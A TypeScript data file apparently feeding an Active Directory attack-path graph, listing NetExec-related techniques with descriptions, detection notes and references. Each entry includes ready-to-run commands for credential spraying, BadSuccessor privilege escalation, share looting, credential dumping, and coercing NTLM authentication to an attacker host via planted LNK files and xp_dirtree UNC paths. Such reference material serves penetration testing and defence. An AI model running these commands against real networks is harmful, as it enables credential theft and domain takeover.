import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/**
 * Gaps found auditing against NetExec (nxc): its wiki and module set. Each is a
 * technique/vector (NetExec is one of the tools). Web-verified; wired into the
 * existing categories with a forward continuation so none dead-ends.
 */
export const adNetexecNodes: TechniqueNodeDef[] = [
  {
    id: 'pre2k-auth',
    label: 'Pre-Windows 2000 Computer Accounts',
    phase: 'initial-access',
    needs: 'none',
    summary: "Pre-staged computer accounts keep a predictable password (lowercased name) until first boot.",
    description:
      "A computer account pre-created with the 'pre-Windows 2000' flag gets an initial password equal to its own name in lowercase (e.g. WS01$ -> 'ws01'), truncated to 14 chars. Until that machine first boots and rotates its password, anyone who can enumerate these stale objects (WORKSTATION_TRUST_ACCOUNT with logonCount 0 / low pwdLastSet) can authenticate as the computer and request a TGT, a quiet foothold for further enumeration and delegation abuse.",
    tools: [
      { name: 'NetExec (pre2k)', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
      { name: 'pre2k (garrettfoster13)', url: 'https://github.com/garrettfoster13/pre2k' },
    ],
    commands: [
      { label: 'Enumerate + try predictable passwords (NetExec)', code: r`netexec ldap dc01.corp.local -u user -p 'Password1' -M pre2k`, lang: 'bash' },
      { label: 'Standalone: spray pre-created machine passwords', code: r`pre2k unauth -d corp.local -dc-ip 10.0.0.1 -inputfile computers.txt`, lang: 'bash' },
    ],
    mitre: mitre('T1078.002'),
    references: [
      { label: 'NetExec Wiki, Pre2k', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
      { label: 'The Hacker Recipes, Pre-Windows 2000 computers', url: 'https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers' },
    ],
    requires: ['Ability to enumerate domain objects (any account; sometimes anonymous)', 'A pre-staged computer object that has never logged on'],
    opsec: 'Spray-like Kerberos pre-auth failures (4771) across many computer names are detectable; a successful logon as a dormant machine account is anomalous. Quiet compared to most footholds.',
  },
  {
    id: 'badsuccessor-dmsa',
    label: 'BadSuccessor (dMSA Abuse)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: "Abuse delegated Managed Service Accounts on Server 2025 to inherit a target principal's SIDs.",
    description:
      "Windows Server 2025 adds delegated Managed Service Accounts (dMSAs) with a migration mechanism. With CreateChild on any OU (or write over a dMSA), an attacker points msDS-ManagedAccountPrecededByLink at a target (e.g. a Domain Admin) and flips msDS-DelegatedMSAState. The KDC then mints the dMSA a PAC carrying the target's SIDs, succeeding the victim without touching their group membership or password. A single Server 2025 DC makes it viable (CVE-2025-53779). Pre-Aug-2025-patch, a one-sided link sufficed; the August 2025 update (CVE-2025-53779) requires a mutual migration pairing, so residual variants persist but the trivial one-sided path is closed on patched DCs.",
    tools: [
      { name: 'NetExec (badsuccessor)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py' },
      { name: 'SharpSuccessor', url: 'https://github.com/logangoins/SharpSuccessor' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add badSuccessor <dmsa-name>', lang: 'bash' },
      { label: 'Check the domain for exploitable dMSA OUs', code: r`netexec ldap dc01.corp.local -u user -p 'Password1' -M badsuccessor`, lang: 'bash' },
      { label: 'Create the dMSA and link it to a target whose SIDs it inherits', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Password1' add badSuccessor evilDMSA --ou 'OU=Eval,DC=corp,DC=local' -t 'CN=Administrator,CN=Users,DC=corp,DC=local'`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'Akamai, BadSuccessor: Abusing dMSA', url: 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory' },
      { label: 'Unit 42, Exploiting Delegated MSAs', url: 'https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/' },
      { label: 'Microsoft, CVE-2025-53779 advisory', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779' },
    ],
    requires: ['CreateChild on an OU, or write over a dMSA object', 'At least one Windows Server 2025 Domain Controller'],
    opsec: 'New dMSA objects and changes to msDS-ManagedAccountPrecededByLink / msDS-DelegatedMSAState are high-signal once detections exist. The new dMSA fires object-creation (5137) as the most reliable primary signal, with attribute writes as 5136; 4662 depends on object-access (SACL) auditing that is off by default. Stealthy where dMSA auditing is absent.',
    versions: ['srv2025'],
    affects: 'Vulnerable component is the Windows Server 2025 DC (dMSA/KDC codepath); one 2025 DC in the forest is enough. Impact is domain-wide: any principal, including Domain Admins on any OS, can be inherited.',
  },
  {
    id: 'smbghost',
    label: 'SMBGhost (CVE-2020-0796)',
    phase: 'priv-esc',
    needs: 'none',
    summary: 'Integer overflow in SMBv3.1.1 compression → kernel RCE / local SYSTEM.',
    description:
      "CVE-2020-0796 ('SMBGhost' / 'CoronaBlue') is a buffer overflow in the SMBv3.1.1 compression handler on Windows 10 / Server 1903-1909. A crafted compressed packet corrupts kernel memory for remote SYSTEM code execution; it is also a reliable local privilege escalation to SYSTEM. A peer of EternalBlue/ZeroLogon for unpatched legacy hosts.",
    tools: [
      { name: 'NetExec (smbghost)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/smbghost.py' },
      { name: 'chompie1337 SMBGhost RCE PoC', url: 'https://github.com/chompie1337/SMBGhost_RCE_PoC' },
    ],
    commands: [
      { label: 'Check a subnet for SMBGhost', code: r`netexec smb 10.0.0.0/24 -M smbghost`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2020-0796', url: 'https://nvd.nist.gov/vuln/detail/cve-2020-0796' },
      { label: 'NetExec module (smbghost.py)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/smbghost.py' },
      { label: 'Microsoft, CVE-2020-0796 advisory', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796' },
      { label: 'ZecOps, SMBGhost local privilege escalation writeup', url: 'https://m417z.com/archive/zecops/Exploiting%20SMBGhost%20for%20a%20Local%20Privilege%20Escalation' },
    ],
    requires: ['For the scanner / remote RCE: network access to TCP/445 on an unpatched Win10 / Server 1903-1909 host', 'For the LPE variant: local code execution at medium integrity on the host, plus an info leak (e.g. NtQuerySystemInformation) to locate the token'],
    opsec: 'The public remote RCE is BSOD-prone and unreliable (frequent kernel crashes on failure); the LPE variant is the comparatively stable path. Either way the kernel exploit is loud, while the vuln check itself is a benign protocol negotiation. Patched everywhere current, so legacy-host only.',
    versions: ['win10-1903', 'win10-1909'],
    affects: 'Windows 10 / Server 1903-1909 only; the SMBv3.1.1 compression handler shipped in build 1903 and the bug was patched out of later builds.',
  },
  {
    id: 'smb-share-loot',
    label: 'SMB Share Spidering & Looting',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Crawl readable shares for passwords, configs, scripts, keys and backups.',
    description:
      'Open and over-shared SMB folders routinely hold credentials: scripts with embedded passwords, unattend.xml / web.config / .kdbx / .ppk / .pem files, runbooks and backups. With any domain creds, recursively spider every readable share, keyword/regex the names and contents, and pull hits.',
    tools: [
      { name: 'NetExec (--spider / spider_plus)', url: 'https://www.netexec.wiki/smb-protocol/spidering-shares' },
      { name: 'Snaffler', url: 'https://github.com/SnaffCon/Snaffler' },
      { name: 'MANSPIDER', url: 'https://github.com/blacklanternsecurity/MANSPIDER' },
    ],
    commands: [
      { label: 'Inventory readable shares to JSON', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M spider_plus`, lang: 'bash' },
      { label: 'Spider + download (default caps files at 50 KB; raise MAX_FILE_SIZE)', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=104857600`, lang: 'bash' },
      { label: 'Built-in: grep share contents for "password"', code: r`netexec smb 10.0.0.20 -u user -p 'Password1' --spider SHARE --content --pattern password`, lang: 'bash' },
      { label: 'Grab a specific file off a share (NetExec; --get-file defaults to C$, so this path needs local admin. For a normal readable share, pass --share <name> with a share-relative path)', code: r`nxc smb <host> -u user -p pass --get-file \Windows\Temp\creds.txt loot.txt`, lang: 'bash' },
    ],
    mitre: mitre('T1552.001'),
    references: [
      { label: 'NetExec Wiki, Spidering Shares', url: 'https://www.netexec.wiki/smb-protocol/spidering-shares' },
      { label: 'The Hacker Recipes, Network shares', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/network-shares' },
    ],
    requires: ['Any domain credentials with read access to one or more shares'],
    opsec: 'Mass file reads generate object-access events (5145) and are noisy at scale; targeted pattern searches are quieter.',
  },
  {
    id: 'ntlm-theft-files',
    label: 'NTLM Theft via Malicious Files',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Plant LNK/SCF/.searchConnector-ms files on writable shares so browsing users leak NetNTLM.',
    description: r`With write access to a frequented share, drop files whose icon/resource path points at an attacker UNC (\\attacker\share). When a user merely browses the folder in Explorer, Windows resolves the icon and authenticates to the attacker host, leaking the user's NetNTLMv2 to crack offline or relay. NetExec automates planting across writable shares (slinky=.lnk, scuffy=.scf, drop-sc=.searchConnector-ms, drop-library-ms=.library-ms / CVE-2025-24054); pair with Responder/ntlmrelayx.`,
    tools: [
      { name: 'NetExec (slinky / scuffy / drop-sc)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/slinky.py' },
      { name: 'ntlm_theft', url: 'https://github.com/Greenwolf/ntlm_theft' },
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
    ],
    commands: [
      { label: 'Plant malicious .lnk on every writable share (slinky icon-attribute LNK is patched on fully-updated Windows since April 2025 and fires inconsistently; prefer drop-library-ms / CVE-2025-24054)', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M slinky -o NAME=docs SERVER=10.0.0.66`, lang: 'bash' },
      { label: 'Drop a .searchConnector-ms to coerce the WebClient/WebDAV service to start (a WebDAV-coercion primitive, often to enable HTTP->LDAP relay, not the SMB icon-leak the other files use)', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M drop-sc -o FILENAME=index URL='\\10.0.0.66\share'`, lang: 'bash' },
      { label: 'Clean up planted files', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M slinky -o CLEANUP=True`, lang: 'bash' },
    ],
    mitre: mitre('T1187'),
    references: [
      { label: 'Secure Ideas, NetExec SMB Slinky', url: 'https://www.secureideas.com/blog/no-broadcast-traffic-no-problem-netexec-smb-slinky-module' },
      { label: 'The Hacker Recipes, Living off the land', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land' },
      { label: 'Microsoft, CVE-2025-24054 advisory', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054' },
      { label: 'Check Point Research, CVE-2025-24054 exploited in the wild', url: 'https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/' },
    ],
    requires: ['Write access to a share that users browse', 'A listener (Responder / ntlmrelayx) to catch the auth'],
    opsec: 'Passive trap: it depends on a victim browsing the folder, but is very stealthy to plant. The captured auth (then crack or relay) is the higher-signal follow-on. Remember CLEANUP.',
  },
  {
    id: 'mssql-impersonation',
    label: 'MSSQL Impersonation Privesc',
    phase: 'priv-esc',
    needs: 'creds',
    summary: 'Abuse EXECUTE AS / IMPERSONATE grants to climb from a low-priv login to sysadmin (sa).',
    description:
      'SQL Server logins are often granted IMPERSONATE on higher-privileged principals (or db-chaining lets you EXECUTE AS another user). Enumerate who you can impersonate; if a path reaches a sysadmin, assume that context and you own the instance; then xp_cmdshell for OS command execution as the SQL Server service account (often, but not always, a high-privilege or Local System account), or pivot via linked servers.',
    tools: [
      { name: 'NetExec (mssql_priv)', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
    ],
    commands: [
      { label: 'Enumerate impersonation privesc paths', code: r`netexec mssql 10.0.0.30 -u user -p 'Password1' -M mssql_priv`, lang: 'bash' },
      { label: 'Escalate to sysadmin via impersonation', code: r`netexec mssql 10.0.0.30 -u user -p 'Password1' -M mssql_priv -o ACTION=privesc`, lang: 'bash' },
    ],
    mitre: mitre('T1078'),
    references: [
      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
      { label: 'NetExec Wiki, MSSQL PrivEsc', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
      { label: 'HackTricks, Abusing AD MSSQL', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html' },
      { label: 'NetSPI, Hacking SQL Server Stored Procedures Part 2: User Impersonation', url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/' },
    ],
    requires: ['A valid SQL login (SQL or Windows auth) with IMPERSONATE / EXECUTE AS grants'],
    opsec: 'Impersonation and xp_cmdshell enablement are auditable SQL events; OS command execution via xp_cmdshell (as the SQL Server service account) is the loud part. Note that mssql_priv ACTION=privesc does not just switch context transiently: it adds your login to the sysadmin fixed server role, a persistent server-level grant (visible in sys.server_role_members / audit, surviving the session). Roll it back with ACTION=rollback; that stray grant, not just the transient impersonation, is the durable IOC.',
  },
  {
    id: 'mssql-sid-enum',
    label: 'MSSQL Domain Account Enumeration',
    phase: 'enumeration',
    needs: 'none',
    summary: 'List domain users and groups from a SQL login via SUSER_SID/SUSER_SNAME, no domain creds.',
    description:
      'A domain-joined SQL Server translates between SIDs and account names with the built-in SUSER_SID / SUSER_SNAME functions, even for principals it holds no rights over. Recover the domain SID prefix from a well-known group (Domain Admins is RID 512), strip the trailing RID to get the 24-byte base, then cycle RIDs (500-1500, extend toward 10000) through crafted little-endian SIDs to resolve a full list of domain users and groups, all without domain authentication. It works from any SQL query channel: a low-privilege login or a SQL-injection UNION/stacked sink. The recovered list seeds password spraying and AS-REP roasting, and surfaces service accounts. This is the SQL-Server equivalent of null-session RID cycling, for when SMB is locked down but MSSQL is reachable.',
    tools: [
      { name: 'NetExec (mssql --rid-brute)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
    ],
    commands: [
      { label: 'Confirm the SQL Server is domain-joined', code: r`SELECT DEFAULT_DOMAIN();`, lang: 'sql' },
      { label: 'Recover the domain SID from a well-known group (Domain Admins = RID 512)', code: r`SELECT master.dbo.fn_varbintohexstr(SUSER_SID('<DOMAIN>\Domain Admins'));`, lang: 'sql' },
      { label: 'Resolve a crafted SID (24-byte base + little-endian RID) to a name', code: r`SELECT SUSER_SNAME(0x<24-byte-SID-base><RID-little-endian>);  -- RID 500 -> ...f4010000`, lang: 'sql' },
      { label: 'One-shot RID brute over a usable SQL login', code: r`netexec mssql 10.0.0.30 -u user -p 'Password1' --local-auth --rid-brute`, lang: 'bash' },
    ],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'Microsoft Docs, SUSER_SID (Transact-SQL)', url: 'https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql' },
      { label: 'Microsoft Docs, SUSER_SNAME (Transact-SQL)', url: 'https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql' },
      { label: 'NetSPI, SID-based domain enumeration via SQL Server', url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/' },
      { label: 'NetSPI, Hacking SQL Server Procedures Part 4: Enumerating Domain Accounts', url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/' },
    ],
    requires: ['An MSSQL query channel: a valid SQL login (even low-priv / local auth) or a SQL-injection UNION/stacked sink', 'The SQL Server is joined to the target domain'],
    opsec: 'SUSER_SID/SUSER_SNAME need no elevated role and no domain authentication, but a first-time RID sweep of unresolved SIDs forces LSA cache-miss lookups that do hit a domain controller (LsaLookupSids over LSARPC). Two signals: many fast queries against the SQL host (database query auditing) and a burst of SID-translation traffic to the DC.',
  },
  {
    id: 'app-config-secrets',
    label: 'Stored App Credential Extraction',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Decrypt creds saved by admin tooling: mRemoteNG, Veeam, PuTTY, WinSCP, RDCMan.',
    description:
      'Admin workstations and jump boxes hoard reusable credentials inside connection-manager and backup tooling. mRemoteNG encrypts confCons.xml with a key derived from a master password; when the user leaves the default password (mR3m) it is trivially decrypted, otherwise the custom password must be brute-forced. Veeam keeps backup-job creds in a local DB recoverable with admin rights; PuTTY/WinSCP/RDCMan/MobaXterm cache session secrets in the registry or profile files. These often yield service or domain-admin creds.',
    tools: [
      { name: 'NetExec (mremoteng / veeam / putty / rdcman)', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-mremoteng' },
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
    ],
    commands: [
      { label: 'Decrypt mRemoteNG saved creds', code: r`netexec smb 10.0.0.20 -u admin -p 'Password1' -M mremoteng`, lang: 'bash' },
      { label: 'Dump Veeam backup credentials', code: r`netexec smb 10.0.0.20 -u admin -p 'Password1' -M veeam`, lang: 'bash' },
      { label: 'Dump WinSCP saved sessions (NetExec)', code: r`nxc smb <host> -u user -p pass -M winscp`, lang: 'bash' },
    ],
    mitre: mitre('T1555'),
    references: [
      { label: 'NetExec Wiki, Dump mRemoteNG', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-mremoteng' },
      { label: 'NetExec Wiki, Dump Veeam', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-veeam' },
    ],
    requires: ['Local admin / SYSTEM on the host holding the app config (some app files are user-readable)'],
    opsec: 'Reading config files / the Veeam DB is far quieter than touching LSASS and bypasses EDR LSASS focus. High-yield against admin jump boxes.',
  },
  {
    id: 'mssql-coerce',
    label: 'MSSQL NTLM Coercion',
    phase: 'credential-access',
    needs: 'creds',
    summary: 'Make the SQL service authenticate to you via xp_dirtree.',
    description:
      "Any MSSQL login, even a low-privileged one, can call xp_dirtree or xp_fileexist against an attacker UNC path (\\\\attacker\\share), forcing the SQL Server service account to authenticate over SMB. Capture the NetNTLM to crack offline, or relay it (to LDAP for RBCD, to ADCS, or to another SQL host). A quiet way to turn read-only database access into the service account's credentials. These two procedures are enabled by default and need no elevated role (xp_fileexist coerces the auth but returns no output to a low-priv caller). xp_subdirs is not a reliable low-priv primitive: a non-sysadmin caller has no OS security context, so it reaches no external path and coerces nothing.",
    tools: [
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (mssql)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
    ],
    commands: [
      { label: 'Coerce via xp_dirtree (interactive)', code: r`mssqlclient.py domain.local/user:'Password1'@10.0.0.30
SQL> EXEC master..xp_dirtree '\\10.0.0.66\share',1,1`, lang: 'bash' },
      { label: 'Coerce over NetExec', code: r`nxc mssql 10.0.0.30 -u user -p 'Password1' -q "EXEC master..xp_dirtree '\\10.0.0.66\share',1,1"`, lang: 'bash' },
    ],
    requires: ['Any MSSQL login (sysadmin not required)', 'A listener (Responder / ntlmrelayx) to catch the auth', 'MSSQL (1433) reachable'],
    mitre: mitre('T1187'),
    opsec: 'xp_dirtree is enabled by default and needs no elevated role: very low-friction. The outbound SMB from the SQL host to an unusual IP is the main signal; have your capture/relay listener running first.',
    references: [
      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
    ],
  },
];

export const adNetexecEdges: AttackEdge[] = [
  // Parents (existing categories)
  { source: 'ad-cat-noauth', target: 'pre2k-auth', description: 'Indicators this path applies: an SMB logon returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT with the correct password (a never-used trust account); a computer account name ending in $ that is a member of Pre-Windows 2000 Compatible Access; userAccountControl == 4128 (WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD) with logonCount == 0.' },
  { source: 'cvegrp-smbprint', target: 'smbghost' },
  { source: 'ad-cat-credaccess', target: 'smb-share-loot', description: 'Indicators this path applies: smbclient -N (null session) or -U domain\\user%pass connecting to a named share; smbmap / smbclient output shows READ or READ/WRITE on a non-default share (Public, Data, users$, Accounting, transfer); netexec -M spider_plus emitting spider_plus.json file inventory.' },
  { source: 'ad-cat-mssql', target: 'mssql-impersonation' },
  { source: 'ad-cat-mssql', target: 'mssql-sid-enum', description: 'Indicators this path applies: MSSQL/TDS reachable on 1433 with a usable query channel (a SQL login or a SQL-injection sink); DEFAULT_DOMAIN() returns a domain name (the SQL host is domain-joined); SUSER_SID(\'<DOMAIN>\\Domain Admins\') returns a 28-byte SID ending in RID 512; SUSER_SNAME on a crafted SID resolves it to a DOMAIN\\account name.' },
  { source: 'ad-cat-user-secrets', target: 'app-config-secrets' },
  // Forward continuations (so none dead-end)
  { source: 'pre2k-auth', target: 'valid-domain-creds', label: 'machine account' },
  { source: 'badsuccessor-dmsa', target: 'domain-admin', label: 'inherit target SIDs' },
  { source: 'smbghost', target: 'local-admin-host', label: 'SYSTEM' },
  { source: 'smb-share-loot', target: 'lateral-movement-cme', label: 'reuse looted creds' },
  { source: 'ntlm-theft-files', target: 'crack-netntlm' },
  { source: 'ntlm-theft-files', target: 'ntlm-relay' },
  { source: 'mssql-impersonation', target: 'mssql-exec', label: 'sysadmin → xp_cmdshell' },
  // MSSQL SID enumeration yields a domain user list (no creds), feeding the same downstream as null-session RID cycling.
  { source: 'mssql-sid-enum', target: 'password-spraying', label: 'username list' },
  { source: 'mssql-sid-enum', target: 'asrep-roasting' },
  { source: 'app-config-secrets', target: 'lateral-movement-cme', label: 'reuse creds' },
  // MSSQL NTLM coercion → capture (crack) or relay, like the other coercion vectors
  { source: 'ad-cat-coercion', target: 'mssql-coerce', description: 'Indicators this path applies: xp_dirtree; xp_fileexist; xp_subdirs.' },
  { source: 'mssql-coerce', target: 'crack-netntlm', label: 'capture NetNTLM' },
  { source: 'mssql-coerce', target: 'ntlm-relay', label: 'relay the auth' },
];
